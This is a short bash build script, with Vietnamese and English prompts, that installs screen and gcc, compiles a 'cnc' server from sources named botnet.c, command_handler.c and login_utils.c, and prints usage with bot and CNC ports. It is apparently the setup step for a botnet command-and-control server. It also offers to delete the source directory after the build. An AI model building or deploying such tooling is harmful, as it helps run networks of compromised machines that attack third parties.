#/bin/bash

apt-get install screen -y
apt-get install gcc -y

cd cnc
gcc -o server main.c login_utils.c checks.c logger.c user_handler.c command_handler.c botnet.c -pthread
mv server ../
cd ..

sleep 1

chmod +x server

echo "DONE, USAGE->: screen ./server <botport> <threads> <cncport>"

read -p "muốn xóa thư mục cnc không?/delete cnc dir (recommended)? (y/n): " answer
if [ "$answer" == "y" ]; then
    rm -rf cnc
    echo "cnc dir deleted, Done!"
else
    echo "Done! exiting"
fi
